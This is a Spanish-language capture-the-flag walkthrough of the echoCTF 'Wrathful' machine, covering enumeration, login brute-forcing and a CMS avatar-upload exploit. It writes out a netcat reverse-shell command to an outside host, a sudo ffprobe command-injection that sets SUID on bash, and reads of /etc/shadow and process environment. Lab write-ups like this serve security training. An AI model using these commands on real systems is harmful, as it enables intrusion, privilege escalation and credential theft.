@jokealex233

---
Holaaaaa buenos días, buenas tardes, buenas noches.

Hoy mostraremos el writeup de la máquina de Wrathful de echoCTF, una máquina muy interesante ya que a borda la vulnerabilidad de ejecutar binarios con permisos de sudo a usuarios que no son root naturalmente.

Es una máquina fascinante e ideal para aprender escalamiento de privilegios en Linux, así como realizar reverse shell y claro como no empezar a calentar motores para máquinas más completas y pesadas en un futuro. Pero para esto empecemos con nuestro reconocimiento activo al tener ya lista la IP, que genera echoCTF.

## Escaneo de nmap

```bash
nmap -sV -sC -Pn -T5 -vvv -oN wrathfulScan.txt 10.0.160.237
```

El siguiente comando de nmap realiza un escaneo a los primeros puertos conocidos de esa dirección IP que es la IP de la máquina víctima y el escaneo lo guarda en un archivo de texto txt. Para tenerlo como evidencia para un reporte de pentesting o para un writeup como el que estoy elaborando en este momento. Podemos ver que este nmap nos obtiene que hay dos puertos abiertos.

- **Puerto: 80** ----> HTTP
- **Puerto: 22** -----> SSH
## Entramos a la pagina web

![[PumaHat/Instructor 2026-2/1 -Cyber-Dojo/img/image-83.png]]

## Enumeración de directorios

```bash
dirsearch -u 10.0.160.237 -i 200
```

Ahora para la enumeracion de directorios usaremos dirsearch esto por si las dudas y para ver si encontramos algún archivo o carpeta que pueda guardar algun dato interesante dentro de esta aplicacion que estamos analizando. En este caso podemos ver que al ejecutar el dirsearch se muestra un pagina de login que es lo siguiente haremos a continuación

## Descubrimos login

![[PumaHat/Instructor 2026-2/1 -Cyber-Dojo/img/image-84.png]]

Al entrar al login podemos ver que este es  un login simple como cualquier otro, sin embargo aunque sabemos que en echoCTF las credenciales de estos logins suelen ser las credenciales por defecto admin:admin o admin:1234 o cualquier otra credencial por defecto popular, debemos revisar todo lo que haya en la pagina en este caso hay un recurso que puede ahorrarnos tiempo al momento de realizar la máquina la cual es el reset password.

## Filtramos nombre de user a través del reset

Al dar click en este reset password se nos solicitará el nombre del usuario al cual queremos restablecer su contraseña en este caso si ingresamos admin podemos notar que se nos notifica que se nos envio un correo para restablecer la contraseña.

Sin embargo si ponemos cualquier otro user, nos marcará que ese usuario no existe dentro de la máquina.

Descubrimos que si es admin.

Y al realizar un poco de bruteforce a manita descubrimos que las credenciales son

user: admin
pass: admin1234

## Estamos dentro CMS

Muy bien ya estamos dentro del CMS, ahora lo que toca es explorar la máquina y ver en que version de este CMS estamos trabajando, por lo que al descubrir su version simplemente hay que hacerle OSINT a esta version en busca de una CVE y PoC quizás para esta version que podamos aprovechar para resolver la máquina en este caso.

Encontramos esa CVE que es 2023-53914 y descubrimos que hay un error al subir una imagen de avatar al momento de editar una imagen de usuario por lo que por ahi podemos insertar un payload con una reverse shell de php.

¿Por qué PHP? Bueno esto es debido a que la aplicacion esta construida sobre PHP.

Hay que subir el payload en la parte de editar la imagen de avatar del usuario.
## Errores al carga payloads

 Al hacerlo nos va mandar un error como el siguiente

```
Imagine\Exception\RuntimeException: Unable to open image /var/www/html/content/tmp/699b371c984f7.phar in /var/www/html/vendor/imagine/imagine/src/Gd/Imagine.php:109  
Stack trace:  
#0 /var/www/html/App/non_namespaced/User.php(1110): Imagine\Gd\Imagine->open()  
#1 /var/www/html/App/non_namespaced/User.php(1089): User->processAvatar()  
#2 /var/www/html/content/modules/core_users/controllers/UserController.php(124): User->changeAvatar()  
#3 /var/www/html/App/non_namespaced/Controller.php(82): UserController->updatePost()  
#4 /var/www/html/App/non_namespaced/ControllerRegistry.php(67): Controller->runCommand()  
#5 /var/www/html/admin/index.php(66): ControllerRegistry::runMethods()  
#6 {main}
```


## Metemos eso a URL, porque si guardo el payload solo no lo ejecuto

```
`http://10.0.160.237/content/tmp/6728db5b6dc10.phar?code=nc -e /bin/bash 10.10.0.54 1222`
```

Al revisar nuestro Netcat ya tendremos conexion

Inicialmente somos el usuario www-data.

```bash
script /dev/null -qc bash

Ctrl + Z

stty raw -echo; fg

reset xterm

stty rows 11 cols 210
```


## Hacemos un sudo -l

```
www-data@wrathful:/var/www/html/content/tmp$ sudo -l
Matching Defaults entries for www-data on wrathful:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on wrathful:
    (ALL : ALL) NOPASSWD: /usr/local/bin/ffprobe
www-data@wrathful:/var/www/html/content/tmp$ 

```

## En camino al root

```
www-data@wrathful:/var/www/html/content/tmp$ sudo /usr/local/bin/ffprobe "; node -e 'require(\"child_process\").exec(\"chmod +s /bin/bash\")';#"
Promise { <pending> }
www-data@wrathful:/var/www/html/content/tmp$ /bin/bash -p

```

## Soi root

```
cat /etc/shadow
cat /etc/passwd
cat /proc/1/environ
```

## Ultima bandera en la carpeta root


## Referencias

https://nvd.nist.gov/vuln/detail/CVE-2023-53914

https://www.exploit-db.com/exploits/51486

https://access.redhat.com/security/cve/cve-2023-53923
